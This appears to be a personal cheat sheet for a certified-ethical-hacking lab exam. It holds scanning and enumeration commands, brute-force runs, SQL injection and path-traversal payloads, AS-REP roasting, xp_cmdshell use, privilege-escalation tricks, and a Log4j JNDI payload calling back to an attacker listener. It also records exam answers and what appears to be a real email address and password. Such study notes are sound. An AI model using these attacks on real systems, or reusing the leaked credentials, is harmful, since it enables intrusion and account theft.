@@ -1,0 +1,1544 @@
+retriev OS by ping TTL:
+Linux + freebsd = 62 on windows / 64 on linux
+Windows = 124 / 128
+Cisco + solaris + aix + openbsd = 254 / 255
+
+-----------------------------------------------------------------------------------------------------------
+Google hack search:
+site:compugen.com  (all sub domaines, sites...)
+site:compugen.com inurl:admin
+site:compugen.com inutitle:check
+ite:compuge.com filetype:pdf
+
+https://securityheaders.io/ = https://securityheaders.com/ (for security headers http/s)
+https://www.ssllabs.com/ssltest/  (for certificates)
+
+https://www.peekyou.com/hassan_aldaalooj
+
+https://search.censys.io/hosts/72.53.93.150   (like shodan.io )
+
+https://hexillion.com/co/DomainDossier.aspx (whois dns + net+ recods)
+
+https://hackvertor.co.uk/urls/10 (obfuscation javascript...)
+
+-----------------------------------------------------------------------------------------------------------
+
+geolocalisation website: ipinfo.io or python3 billcipher.py 
+
+curl https://ipinfo.io/162.219.226.231
+curl https://ipinfo.io/$1
+https://www.ipvoid.com/ip-geolocation/
+
+loc: "40.2338,-111.6585"
+
+or python3 billcipher.py 
+
+nmap --script ip-geolocation-maxmind 162.241.216.11
+nmap -sV --script=http-headers 10.10.6.11
+
+-----------------------------------------------------------------------------------------------------------
+-Identify windows server 2019, access it and find scan report which shows total number of directory Listing:
+
+nmap -A 192.168.10.0/24 (should tell you OS + ports open)
+nmap --open 192.168.10.144
+ftp open on a server 2019 so hack
+hydra -L users.txt -P password.txt ftp://192.168.10.144
+ftp
+open 192.168.10.144
+Parker/Passw0rd@1234
+cd Documents
+get w_report.pdf
+File explorer in /home/attacker and open w_report.pdf with LibreOffice Draw
+
+go to /home/attacker and open it with Libre Office Draw
+in the pdf search / go to Directory Listing of sensitive files sections and go to last section of it like 12.36 
+and 36 the last page of the section means 36 Directory Listing of sensitive files on the website
+*total number of directory Listing check title and count how mant pages Minus - the blank page with no response
+
+-----------------------------------------------------------------------------------------------------------
+-Identify attacker ip on Honeypot log file.log :
+
+Check ip for login attempt failed + could not read /etc/user...access denied...in the log file
+*The Cowrie honeypot has default credentials set to root / * (with root as username and taking any character or word for pwd)
+
+-----------------------------------------------------------------------------------------------------------
+-DDOS attack, Determine attacker ip which has transmitted more number of packets to the target machine:
+
+Wireshark check Remote ip with Incoming bytes high and port used UDP 58777 + 5353..54866 tcp (blocked)
+*Incoming bytes Outgoing bytes sometimes marked has blocked (Outgoing bytes could be 0 for some)
+192.168.10.222
+*port high: 54866...58777...
+
+-----------------------------------------------------------------------------------------------------------
+
+-Identify if website www.certifiedhacker.com allows zone transfer:
+
+dig www.certifiedhacker.com axfr
+Transfer failed
+
+dig axfr www.certifiedhacker.com ns1.bluehost.com
+
+nslookup
+set querytype=soa
+ls -d ns1.bluehost.com
+
+-Identify website server technology www.certifiedhacker.com:
+whatweb www.certifiedhacker.com
+Apache
+
+-----------------------------------------------------------------------------------------------------------
+-Identify live machine in 172.16.0.0/24 via ping sweep:
+
+nmap -sn 172.16.0.0/24 (remove -1 from the result 6 -1 = 5)
+nmap -sn -PR 172.16.0.0/24 (If icmp block)
+fping -a -g 172.16.0.0/24 2>/dev/null
+hping3 -1 10.0.1.x --rand-dest -I eth0
+
+-----------------------------------------------------------------------------------------------------------
+-Find linux ssh server on 192.168.10.0/24:
+
+nmap -p 22 -A 192.168.10.0/24 --open
+
+-----------------------------------------------------------------------------------------------------------
+-SMB enumeartion and check if message signing feature is required or not:
+
+nmap -p 139,445 172.30.10.0/24 --open
+nmap -A 172.30.10.200
+(It's enabled but NOT REQUIRE !!!)
+
+nmap --script smb2-security-mode -p 445 192.168.31.105
+enum4linux -S 192.168.31.105
+enum4linux -u martin -p apple -n 192.168.31.105  (-n get usernames)
+enum4linux -u martin -p apple -a 192.168.31.105  (-a everything)
+
+smbclient -L //192.168.31.105 -m SMB2
+smbclient -L //192.168.31.105 -k
+
+-----------------------------------------------------------------------------------------------------------
+-Identify attack category of the oldest CVEs that affects www.goodshoping.com:
+
+nmap -sV --script http-enum www.goodshoping.com (Identify Login Page)
+
+search on https://nvd.nist.gov/vuln/search#/nvd/home?resultType=records
+
+answer: Cross-Site Scripting (XSS) 
+could have been = Remote Code Execution (RCE), SQL Injection (SQLI), and Server-Side Request Forgery (SSRF)
+Cross-Site Request Forgery (CSRF) + OS Command Injection (RCE vector) + Code Injection (RCE)
+
+*Try OWASP Zap scan also for cve:
+
+-Perform vulnerability analysis using OpenVAS and find QoD percentage % of vulnerability severity as medium:
+sudo su
+docker run -d -p 443:443 --name openvas mikesplain/openvas
+docker start openvas
+https://127.0.0.1/ = admin/admin
+OpenVAS Dashboards appears. Navigate to Scans --> 
+Tasks from the Menu bar - click the Task Wizard option - enter the target IP
+check results and you can export it for analysis on the bottom fleche du bas
+QoD: 70
+
+Try winPEAS but no result of cve:
+nmap --open 172.30.10.200
+hydra -L users.txt -P rockyou.txt 172.30.10.200 rdp
+Administrator
+Passw0rd@1234
+Then use Remmina to rdp to target and download winpeas.
+winPEAS.bat
+-----------------------------------------------------------------------------------------------------------
+
+-Identify type of security policies is missing to detect and mitigate Cross-Site Scripting XSS & SQL injection attacks:
+apt-get install wapiti
+wapiti -u http://www.goodshoping.com
+$firefox /root/.wapiti/generated_report/www.goodshoping.com_06092025.html
+Result: CSP = Content Security Policy (to help and mitigate XSS and data injection)
+
+-----------------------------------------------------------------------------------------------------------
+
+-Do a bruteforce attack on www.cehorg.com = 192.168.0.222 and find password for user adam:
+nmap -sC -sV 192.168.0.222
+nmap --open 192.168.0.222
+www.cehorg.com:8080 found, wamp server with DVWA but level impossible (admin:password) and wordpress found so:
+wpscan --usernames adam -P rockyou.txt --url http://192.168.0.222:8080/CEH/
+orange1234
+
+*You can also check http://192.168.0.222:8080/phpmyadmin/index.php
+
+-----------------------------------------------------------------------------------------------------------
+-Search in CWE list quick access on the 2023 CWE Top 25 most dangerous weakness ID of the last entry:
+https://cwe.mitre.org/ + https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html
+
+*list and find the top weakness in the list “Weaknesses in the 2023 CWE Top 25 Most Dangerous Software Weakness.
+-Identify name of Weakness ID: 276
+Incorrect Default Permissions
+
+-----------------------------------------------------------------------------------------------------------
+-find smtp server on 172.30.10.0/24:
+
+nmap -p 25 172.30.10.0/24 --open
+
+nmap -p 25,587,465 --open 172.30.10.0/24
+masscan 192.168.0.0/24 -p 25,587,465 --rate 1000
+smtp-user-enum -M VRFY -U userlist.txt -t 172.30.10.200
+telnet 172.30.10.200 (check smtp banner)
+172.30.10.200
+
+nmap -p 25 --script smtp-open-relay 172.30.10.114
+nmap -p 25 --script smtp-commands 172.30.10.114
+-----------------------------------------------------------------------------------------------------------
+
+-DNS enumeration on certifiedhacker.com to find the name servers used by the domain:
+
+dig ns certifiedhacker.com (ns1.bluehost.com, ns2bluehost.com)
+host certifiedhacker.com
+host certifiedhacker.com 8.8.8.8
+
+dig NS certifiedhacker.com / dig theforce.net ANY +noall +answer
+nslookup -type=NS certifiedhacker.com
+dnsrecon -d certifiedhacker.com
+
+nslookup
+set type=a
+www.certifiedhacker.com
+
+Non-authoritative answer:
+Name:    certifiedhacker.com
+Address:  162.241.216.11
+Aliases:  www.certifiedhacker.com
+
+> set type=ns
+> www.certifiedhacker.com
+
+Non-authoritative answer:
+www.certifiedhacker.com canonical name = certifiedhacker.com
+certifiedhacker.com     nameserver = ns1.bluehost.com
+certifiedhacker.com     nameserver = ns2.bluehost.com
+
+-----------------------------------------------------------------------------------------------------------
+-find ip domain controller on 10.10.10.0/24: + NetBIOS_Domain_Name 
+
+nmap -A -p 389 --open 192.168.0.0/24
+nmap -p 88 -sV 192.168.0.0/24 (Domain Controller) 
+nmap -A -sC -sV 192.168.0.222 (NetBIOS_Domain_Name) = SKILL.CEH
+
+DNS Tree Name result from above nmap:
+
+SKILL.CEH.com
+
+nslookup
+set type=SRV
+_ldap._tcp.dc._msdcs.ceh.com
+or
+nmap -p 88,389,636,3268 --open 10.10.10.0/24
+-----------------------------------------------------------------------------------------------------------
+
+-perform host discovery scanning and identify NETBIOS name of 10.10.10.25   Format : AAAAA.AAA or SNMP check
+nmap -A 192.168.0.222
+nmap -p 88 -sC -sV 192.168.0.222
+SKILL.CEH
+
+nmap -p 139,445 --script nbstat -T4 192.168.31.105
+nbtstat -a 192.168.31.105
+net view \\192.168.31.105 /ALL
+net view /domain:ad.init
+
+snmpwalk -v2c -c public 192.168.31.105
+snmp-check 192.168.31.12 
+
+-Find out DNS_Tree_Name of 192.168.0.222:
+nmap -A -sC -sV 192.168.0.222
+SKILL.CEH.COM
+
+-----------------------------------------------------------------------------------------------------------
+
+-Find ip of NFS server and port 21 (ftp):
+nmap -p 21,2049 10.10.10.0/24
+nmap -p 111 10.10.10.0/24
+
+apt install nfs-common = client 
+showmount -e 10.10.10.25
+
+-----------------------------------------------------------------------------------------------------------
+
+-Find SSH server vulnerable version and identify versions of actual openSSH + OS:
+nmap -p 22 -sV --open 192.168.10.0/24
+
+-determine machine OS of MySQL server on 172.30.10.0/24 :
+nmap -p 3306 --open 172.30.10.0/24
+once ip found
+nmap -A 172.30.10.99  (port 80 shows Apache Ubuntu)
+Ubuntu
+
+nmap -p 22 --script ssh-hostkey 172.30.10.99
+
+-----------------------------------------------------------------------------------------------------------
+-Scan 192.168.10.0/24 find IP os MSSQL / SQL server:
+
+nmap -p 1433 192.168.10.0/24 --open
+
+-------------------------------------------------------------------------------------------------------------
+
+-website might be vulnerable to blind sql injection with MySql determine machine OS on it ?:
+*OWASP* or try below
+sqlmap -u "http://target.com/page?id=1" --technique=B --risk=3 --level=5
+http://target.com/page?id=1 AND SLEEP(5)
+If the page takes longer to load (e.g., 5 seconds), the site is likely vulnerable to SQL injection. You can use boolean-based payloads like:
+http://target.com/page?id=1 AND 1=1
+http://target.com/page?id=1 AND 1=2
+
+nmap -sV -p 80,443 target.com
+curl -I http://target.com
+nikto -h http://target.com -o result -F txt
+nikto -h http://target.com -Tuning x (all scans run)
+skipfish -o /tmp/skipfish_output http://target.com
+
+-----------------------------------------------------------------------------------------------------------
+-perform ldap search on DC machine and find out the latest version of the ldap protocol:
+
+ldapsearch -x -H ldap://192.168.31.105 -D "ad\phil" -W -s base -b "dc=ad,dc=init" supportedLDAPVersion
+Answer at dc home is = LDAPv3
+sudo apt install ldap-utils
+
+nslookup -type=SRV _ldap._tcp.YOUR_DOMAIN  IR
+nmap -p 389,636 --open 192.168.31.0/24 (to find DC)
+nmap -p 88,389,636,3268 --open 10.10.10.0/24
+
+*Find base
+ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -x -s base -b "" "defaultNamingContext"
+
+*perform ldap enumeartion on 10.10.10.0/24 and find how many users account are associated with the domain:
+
+nmap 192.168.31.105 --script=*user*
+
+ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -b "dc=ad,dc=init" "(objectClass=user)" sAMAccountName
+
+ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -b "dc=ad,dc=init" "(objectClass=user)" sAMAccountName | grep sAMAccountName | wc -l
+
+
+Script the whole thing: check.sh
+
+for ip in $(nmap -p 389 --open -oG - 10.10.10.0/24 | grep "389/open" | awk '{print $2}'); do
+    echo "Checking $ip for users..."
+    ldapsearch -H ldap://$ip -D "DOMAIN\username" -W -b "dc=yourdomain,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName | wc -l
+done
+
+*Find DC ip via bash script:
+for ip in $(nmap -p 88,389,636,3268 --open -oG - 10.10.10.0/24 | grep "open" | awk '{print $2}'); do
+    echo "Potential Domain Controller found at $ip"
+done
+
+-what is the dns of the DC:
+nslookup -type=SRV _ldap._tcp.dc._msdcs.ad.int
+dig _ldap._tcp.dc._msdcs.ad.init SRV
+ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -b "dc=ad,dc=init" "dnsHostName"
+#Result: WIN-UCMMADBCI7A, Domain Controllers, ad.init
+dn: CN=WIN-UCMMADBCI7A,OU=Domain Controllers,DC=ad,DC=init
+dNSHostName: WIN-UCMMADBCI7A.ad.init
+
+Via PS:
+(Get-ADDomainController -Discover -DomainName "ad.init").HostName
+
+-----------------------------------------------------------------------------------------------------------
+-Crack RDP credential for Maurice on 192.168.10.0/24 via users.txt and rockyou.txt:
+
+nmap -p 3389 192.168.10.0/24 --open
+*you can find 2 hosts using rdp so hydra both if no result:
+hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp
+Pumpkin@1234
+
+Then use Remmina to rdp to target
+#remmina (will launch gui...)
+
+-----------------------------------------------------------------------------------------------------------
+-Determine the Parent PID of H3ll0.exe from Logfile.PML:
+*Copy Logfile.PML from Linux to Windows then analyze the H3ll0.exe
+use Procmon.exe from tools provided on windows, do not download...
+click on Filter - Process Name - is - H3ll0.exe - Add - ok then double click on the result - 2ND tab (process) for PPID
+
+-----------------------------------------------------------------------------------------------------------
+-Intense scanning on 10.10.10.25 and find out fqdn:
+
+nmap -A -T4 10.10.10.25
+nmap--script smb-os-discovery 10.10.10.25
+nslookup 10.10.10.25
+dig -x 10.10.10.25
+ldapsearch -H ldap://10.10.10.25 -x -s base -b "" "dnsHostName"
+
+-identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly: 
+Scan the target subnets and determine the IP address using rpcap service:
+
+nmap -p 2002 192.168.10.0/24
+-----------------------------------------------------------------------------------------------------------
+
+-vulnerability scan of webserver using OpenVas and identify severity level of rpc vulneraibility:
+
+docker run -d -p 443:443 --name openvas mikesplain/openvas
+*If already exists
+docker ps
+docker start openvas
+Scans -> Tasks -> New Task
+Set the scan type to a full scan or a web application scan depending on the nature of your target.
+
+*Run the Scan - Click on Save and then Start
+After the scan completes, go to the Results section and filter for vulnerabilities related to RPC
+*Identify any FTP related vulnerability = FTP Unencrypted Cleartext Login
+QoD: 70 % for severity level as medium
+
+-----------------------------------------------------------------------------------------------------------
+-vulnerability scan of linux on 192.168.10.0/24 via OpenVas and find number of vulnerabilities with severity level as medium:
+nmap -A -p 22 --open 192.168.10.0/24
+
+docker run -d -p 443:443 --name openvas mikesplain/openvas
+docker start openvas
+https://localhost:9392
+Scans -> Tasks -> New Task
+Set the scan type to a full scan or a web application scan depending on the nature of your target.
+
+*Run the Scan - Click on Save and then Start
+After the scan completes, go to the Results section and filter for vulnerabilities related to RPC. You will see a list of findings that could include:
+CVE (Common Vulnerabilities and Exposures) related to RPC misconfigurations.
+OpenVAS's severity levels, such as Low, Medium, High, or Critical, assigned to each vulnerability.
+
+---------------------------------------------------------------------------------------------------------------------
+-malware scanning via virustotal and what is the last 4 digits of file SHA-256 hash value:
+d282
+
+-Find entropy value of file Tornado.elf, use Cyberchef: via https://gchq.github.io/CyberChef/
+double click entropy and in Input drop the ELF file.
+2.87 (value up to 2 decimals)
+
+Otherwise DIE on windows:
+click on the right Advanced  then Entropy icon will appears in the middle
+
+or
+Otherwise entropyscan: 
+sudo git clone https://github.com/sandflysecurity/sandfly-entropyscan.git
+cd sandfly-entropyscan
+Go into the repo directory and build it:
+sudo go build
+Run the binary with your options:
+./sandfly-entropyscan -file /tmp/Tornado.elf (result -1 compare to cyberchef result)
+
+---------------------------------------------------------------------------------------------------------------------
+last 4 digits of SHA 384 hash of the file with highest entropy value:
+An insider attack has been identified in one of the employees mobile device in
+192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain
+malicious elf files stored in a folder "Scan". Perform deep scan on the elf files and obtain
+the last 4 digits of SHA 384 hash of the file with highest entropy value. (Cyberchef for Entropy)
+
+find /mnt/scan -type f -exec file {} + | grep ELF | awk -F: '{print $1}'
+*Once ELF file found
+import os
+import math
+import hashlib
+
+def calculate_entropy(file_path):
+    with open(file_path, 'rb') as f:
+        data = f.read()
+        if len(data) == 0:
+            return 0
+        entropy = 0
+        for x in range(256):
+            p_x = float(data.count(bytes([x]))) / len(data)
+            if p_x > 0:
+                entropy += - p_x * math.log2(p_x)
+        return entropy
+
+def sha384_last4(file_path):
+    with open(file_path, 'rb') as f:
+        file_hash = hashlib.sha384(f.read()).hexdigest()
+        return file_hash[-4:]
+
+# Directory containing ELF files
+directory = "/path/to/your/files"  # Replace with your directory
+
+# Identify ELF files and calculate their entropy
+elf_files = [os.path.join(directory, f) for f in os.listdir(directory) if "ELF" in os.popen(f'file "{os.path.join(directory, f)}"').read()]
+file_entropies = [(file, calculate_entropy(file)) for file in elf_files]
+
+# Find the file with the highest entropy
+max_entropy_file = max(file_entropies, key=lambda x: x[1])[0]
+
+# Compute and print the last 4 digits of its SHA-384 hash
+print("File with highest entropy:", max_entropy_file)
+print("Last 4 digits of SHA-384 hash:", sha384_last4(max_entropy_file))
+
+*Now run the script: python3 entropy_scan.py
+
+Viewing and Analyzing ELF Files:
+
+file example.elf
+strings example.elf
+readelf -a example.elf
+objdump -d example.elf
+
+-----------------------------------------------------------------------------------------------------------
+-Misconfgured SQL server vulnerability on DC of client under target domain controller :
+(find the file MSS.txt under Public Downloads and determine the size in bytes)
+
+1- Find a MSSQL server on client authentificated to DC: (try other subnet if no Impacket error and could be 2 ms=sql-s on 1433 so try both)
+nmap -p 1433 192.168.10.0/24 --open (good mssql)
+nmap -p 1433 192.168.0.0/24 --open (wrong ms-sql also DC...+ impacket cmd failed "Encryption Required switching to TLS"
+
+2- hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql (good one)
+2- hydra -L users.txt -P password.txt 192.168.10.144 mssql (was giving me user & pwd but when impacket "Encryption Required..."
+
+cd /root/impacket/examples/
+python3 /root/impacket/examples/mssqlclient.py SKILL.CEH.com/Server_mssrv:Spidy@192.168.10.144 -port 1433
+
+xp_cmdshell dir c:\users\Public\Downloads
+7 Bytes
+xp_cmdshell 'whoami'
+xp_dirtree
+xp_cmdshell type c:\inetpub\wwwroot\issstart.htm
+----------------------------------------------------------------------------------------------------
+-Analyse / Find domain controller and perform AS-REP roasting attack on users account and find password of vulnerable user:
+
+nmap -A -p 389 192.168.10.0/24 --open  (if can't find a dc try another subnet from above questions)
+nmap -A -p 389 192.168.0.0/24 --open 
+nmap -A -p 389 192.168.0.0/24 --open 
+
+find / -name GetNPUsers.py
+(you will see where to execute it from for example)
+
+cd /usr/share/doc/python3-impacket/examples
+
+python3 GetNPUsers.py SKILL.CEH.com/ -usersfile /home/attacker/users.txt -dc-ip 192.168.0.222 -request -format john
+*Copy from beginning of username until the end of hash and save it via pluma to roast.txt
+Joshua@SKILL.CEH.COM:e73333333333333abdxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+john --wordlist=rockyou.txt roast.txt
+c3ll0@123
+
+*If you have a valid account and check which uers does not have pre-authentification on account:
+Get-aduser -filter { UserAccountControl -band 4194304}
+bitmask value 4194304. Each flag in UserAccountControl has a specific meaning.
+4194304 corresponds to DONT_REQ_PREAUTH → "Do not require Kerberos preauthentication."
+Save result hashes.txt and use Rubeus to crack the password:
+
+PS c:\.\Rubeus asreproast /user:frank /format:hashcat /outfile:/hashes.txt
+
+hashcat.exe -a 0 -m 18200 -o crack.txt hashes.txt rockyou.txt
+start notepad crack.txt (end of file shows password)
+
+https://www.youtube.com/watch?v=zl0v5lYSNlQ
+
+impacket-* should already been installed Otherwise:
+cd /opt
+sudo git clone GitHub - fortra/impacket: Impacket is a collection of Python classes for working with network protocols.
+cd impacket
+pip3 install . ← note the space and period at the end
+
+sudo python3 setup.py install
+----------------------------------------------------------------------------------------------------
+
+perform vertical privilege escalation:
+
+You used shoulder surfing to identify the username and password of a user on the
+Ubuntu machine in the 192.168.0.0/24 network, that is, smith and L1nux123. Access the
+target machine, perform vertical privilege escalation to that of a root user, and enter the
+content of the imroot.txt file as the answer.
+
+sudo misconfigurations
+sudo /bin/bash
+sudo -l
+su -
+sudo su
+
+find / -type f -perm /4000 2>/dev/null
+/usr/bin/find . -exec /bin/bash \;
+find / -name *.txt -ls 2>dev/null
+
+uname -r for kernel Exploit https://www.exploit-db.com/
+
+find / -type f -perm -0002 2>/dev/null
+
+sudo crontab -l
+cat /etc/crontab
+
+ls -l /etc/passwd
+cat /etc/passwd
+
+*If any of the system configuration files like /etc/passwd, /etc/sudoers, or others are world-writable or group-writable, 
+an attacker can modify them to escalate their privileges.
+
+winPEAS + LinPEAS + LinEnum = wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+--------------------------------------------------------------------------
+Find The executables Entry point Address: 
+A suspicious executable file "malicious-file". Your need to find what is the executable's Entry point (Address). 
+-During an assignment, an incident responder has retained a suspicious executable file
+"die". Your task as a malware analyst is to find the executable's Entry point
+(Address). The file is in the C:\Users\Admin\Documents directory in the "EH Workstation
+– 2" machines.
+
+Method 1: Using Detect It Easy (DIE)
+Open Detect It Easy (DIE): Launch the DIE application on your machine.
+
+Load the Executable + click on Advanced:
+
+Drag and drop the executable file (e.g., .exe, .dll) into DIE, or use the File > Open menu to load the file.
+Locate the Entry Point Address:
+
+After the file loads, DIE will display various sections and metadata about the file.
+Look for a section labeled Entry Point or EP. This entry point is the address where the executable’s main code begins executing.
+
+Interpret the Entry Point Address:
+
+DIE: should show the entry point in both virtual memory address and offset format (relative to the start of the file).
+The entry point address is typically displayed in hexadecimal format.
+
+Ghidra: Using Ghidra
+Open Ghidra and import the executable into a new project.
+After analysis, Ghidra will display a "Functions" list. The _entry function or main function is usually near the top.
+Right-click the function, select Properties, and look for the Entry Point address.
+
+IDA: Using IDA Freeware or Pro
+Open IDA, and load the executable.
+IDA will automatically analyze the file and display the Entry Point address in the output window or in the "Segments" pane.
+
+----------------------------------------------------------------------------------------------------------------------------------
+Burp Suite: Exploit the web application available at 172.20.0.12 and enter the flag's value at the page with page_id=84
+
+Burp Suite: Use the Spider feature in Burp Suite to crawl the website and capture the request/response for page_id=84. 
+This will help you find hidden parameters or possible injection points.
+Burp Suite's Intruder function can help in brute-forcing login forms or session cookies.
+or
+page_id=84 OR 1=1
+page_id=84' AND 1=1--
+page_id=../../../../etc/passwd
+page_id=; ls
+
+SELECT flag FROM flags WHERE page_id=84;
+
+-------------------------------------------------------------------------------------------------------
+-Perform vulnerability research and exploit the web application training.cehorg.com : 
+available at 192.168.0.64. Locate the Flag.txt file and enter its content as the answer.
+
+-A file named Hash.txt has been uploaded through DVWA
+(http://172.20.0.16:8080/DVWA). The file is located in the
+“C:\wamp64\www\DVWA\hackable\uploads\” directory. Access the file and crack the
+MD5 hash to reveal the original message. Enter the decrypted message as the answer.
+You can log into the DVWA using the credentials admin/password.
+
+'or 1=1--    (in DVWA SQL injection you will get user ID)
+
+google: sqli cheat sheet github = https://github.com/payloadbox/sql-injection-payload-list
+
+-vulnerability Linux server port 8080 (could be Log4J / WAMP) exploit and access RootFlag.txt : 
+  
+nmap -A -p 8080 172.30.10.0/24 --open  (last HOP = ip not first Hop 1 IP)
+(find Apache Tomcat / Coyote JSP = log4J vunlerable)
+http://172.30.10.99:8080
+
+"replace jdk version to match the one required": read README file...show nc port....
+cd /home/attacker/log4j-shell-poc
+
+Go to Oracle.com / search for 8u20 (Whole Words in Search):
+download jdk-8u20-linux-x64.tar.gz
+Download, search for 8u20 (Whole Words in Search)
+philippe.henry75@gmail.com
+Zarma2020$
+
+mv jdk-8u20-linux-x64.tar.gz /home/attacker/log4j-shell-poc
+tar -xf jdk-8u20-linux-x64.tar.gz
+
+"open terminal tab - other window":
+nc -lvp 9001
+other TAB:
+python3 poc.py --userip 172.30.25.attackerip --webport 8000
+"copy the result to the username box:"
+${jndi:ldap://172.30.25.attackerip:1389/a}
+Password = password
+ls
+cat RootFlag.txt
+Ch@mp2022
+
+*Otherwise download the docker image and don't forget space . : docker build -t log4j-shell-poc .
+docker run --network host log4j-shell-poc
+
+-------------------------------------------------------------------------------------------------------
+
+-There is a machine running wamp server in the subnet. Provide the IP address of the server:
+While investigating an attack, you found that a Windows web development environment was exploited to the system. 
+Perform extensive scanning and service enumeration of the target networks and identify the IP address of WampServer
+
+nmap -A -p 8080 --open 192.168.1.0/24
+nmap -p 80,443,8080 -sC -sV --open 192.168.1.0/24
+
+-------------------------------------------------------------------------------------------------------
+-File webpen.txt on 192.168.10.101, use SMB:
+
+hydra -L users.txt -P rockyou.txt 192.168.10.101 smb
+username=Martin,password=qwerty1234
+
+Open it via Explorer smb://192.168.10.101 go to Users - Martin - Music
+
+Or:
+mkdir /mnt/smb
+mount -t cifs //192.168.10.101/users /mnt/smb/ -o username=Martin,password=qwerty1234
+cd /mnt/smb
+find /mnt/smb -name "webpen.txt"
+cat /mnt/smb/Martin/Music/webpen.txt (highlited = the site with "www.moviescope.com") 
+so browse the site and F12 to view-source:http://www.x.com
+*Find the Meta-Author = F12 dev mode EC-Council:
+you can also try via explorer - smb://192.168.10.101
+
+-------------------------------------------------------------------------------------------------------------
+-Identify the machine with smb enabled. Crack the smb credentials for the username given.:
+
+Crack the SMB credentials for user Henry and obtain Sniff.txt file containing an encoded secret. 
+Decrypt the encoded secret and enter the decrypted text as the answer. Note Use Henry’s password to decode the text
+
+nmap -p 445 --open 192.168.1.0/24
+hydra -L users.txt -P rockyou.txt 192.168.1.X smb
+Martin/qwerty1234  (You can then also use Explorer on Parrot and smb://192.168.1.X)
+mkdir /mnt/smb
+mount -t cifs //192.168.1.X/users/martin /mnt/share -o user=Martin,password=qwerty1234
+cd /mnt/smb
+ls
+find /mnt/smb/ -name "webpen.txt"
+result, /mnt/smb/Martin/Music/webpen.txt
+cat /mnt/smb/Martin/Music/webpen.txt (highlited = the site with "") so browse the site and F12 to view-source:http://www.x.com
+*Find the Meta-Author = F12 dev mode EC-Council:
+
+medusa -h 192.168.1.X -u username -P /path/to/wordlist.txt -M smb
+python3 /path/to/secretsdump.py -just-dc-ntlm smb://192.168.1.X  (to extract the hash of SMB credentials and then crack them)
+smbclient //192.168.1.X/share -U username
+mount -t cifs //192.168.1.X/share /mnt/share -o user=username,password=password
+net view /domain 
+smbclient -L //192.168.1.X -U guest
+
+-------------------------------------------------------------------------------------------------------
+
+-Identify the type of encoding or encryption used on a file:
+
+cat hidden_text.txt
+file hidden_text.txt
+ent hidden_text.txt
+xxd hidden_text.txt | head -n 20
+binwalk hidden_text.txt
+hashid hidden_text.txt
+
+-------------------------------------------------------------------------------------------------------
+Steganography:
+
+*If you have passwd - steghide on parrot:
+steghide extract -sf cover.jpeg -p azerty@123
+extarct to hidden.txt
+cat hidden.txt
+
+-to encrypt secret.txt and add secret / blank space
+SNOW.EXE -C -m "062014" -p "pa$$word" secret.txt hiddensecret.txt
+-to decrypt message
+SNOW.EXE -C -p "pa$$word" hiddensecret.txt
+
+Image.jpg find details, info:
+
+exiftool Image.jpg
+
+sgpt --shell "Use steghide to extract hidden text in photo.jpg image file"
+
+-------------------------------------------------------------------------------------------------------
+
+#openstego for images encrypt + decrypt (gui for images hidding message)
+#Decode ciphers: ceasar ciphers ....
+https://rot13.com/ 
+echo "CVPLKDSAsdsd{P7E15asdasdas}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  ()
+https://10015.io/tools/md5-encrypt-decrypt
+https://10015.io/tools/base64-encoder-decoder
+https://10015.io/tools/url-encoder-decoder
+
+-------------------------------------------------------------------------------------------------------
+
+#BCTEXTENCODER for encryption & decryption
+-BcTextEncoder: For encoding / decoding text in file .hex
+Put in Encode the key then click on Decode and put the pwd given
+
+# Check for Base64
+base64 --decode yourfile
+echo cGlJ0taxxxxxx | Base64 -d (decode base64)
+
+# Check for hex
+xxd -r -p yourfile.hex
+
+-------------------------------------------------------------------------------------------------------
+
+-Access an encrypted file and decode the encrypted file to retrieve the flag:
+Identify the Encryption Type Before you can decode the file, Common encryption types include
+
+AES (Advanced Encryption Standard)
+DES (Data Encryption Standard)
+RSA (Asymmetric encryption)
+Base64 encoding (for simple obfuscation)
+
+file encrypted_file
+xxd encrypted_file
+strings encrypted_file
+
+*Attempt Decryption:
+
+openssl enc -d -aes-256-cbc -in encrypted_file -out decrypted_file -pass pass:yourpassword
+openssl rsautl -decrypt -inkey private_key.pem -in encrypted_file -out decrypted_file
+base64 -d encrypted_file > decoded_file
+
+*Brute-forcing or Cracking the Key:
+
+john --format=zip encrypted_file.zip
+john ~/Documents/hashes.txt --format=NT --wordlist ~/Desktop/Wordlist/password.txt
+
+cat decrypted_file | grep -i "flag"
+
+-------------------------------------------------------------------------------------------------------------------
+Find out the Password: 10.10.10.25
+
+Lophtcrack
+
+L0phtCrack -> Password Auditing wizard -> Next -> Next -> A Remote machine -> Host(ip) -> Use specific user credentials 
+-> Username (Administrator), Password (given) -> Next -> ~~~ -> finish
+-------------------------------------------------------------------------------------------------------------------
+
+To found data from malware face.exe:
+
+BinText
+-------------------------------------------------------------------------------------------------------------------
+To perform windows service monitoring & find out the service type "afunix":
+
+Get-WmiObject Win32_Service -Filter "Name='Spooler'" | Select-Object Name, ServiceType
+
+Name    ServiceType
+----    -----------
+Spooler Own Process
+
+Get-WmiObject Win32_Service -Filter "Name='BthAvctpSvc'" | Select-Object Name, ServiceType
+
+Name        ServiceType
+----        -----------
+BthAvctpSvc Share Process
+-------------------------------------------------------------------------------------------------------------------
+To perform DHCP starvation attack. find the transaction ID of the DHCP discover packets:
+
+sudo tcpdump -i eth0 -v
+
+yersinai -G Launch attack --> DHCP --> sending Discover packet --> OK
+-------------------------------------------------------------------------------------------------------------------
+To analyse and find out the protocol used for sniffing on its network:
+
+Use filter and search arp
+-------------------------------------------------------------------------------------------------------------------
+To analyze packet id that uses ICMP protocol:
+
+use filter and search icmp in wireshark
+
+Then see the info field there you have an id.
+-------------------------------------------------------------------------------------------------------------------
+To find the length of the data in UDP packet:
+
+Use filter udp
+
+and search the data
+-------------------------------------------------------------------------------------------------------------------
+To determine the no of machines used to initiate the attack: 3
+
+Wireshark - conversations, DDOS — ipv4
+
+-------------------------------------------------------------------------------------------------------------------
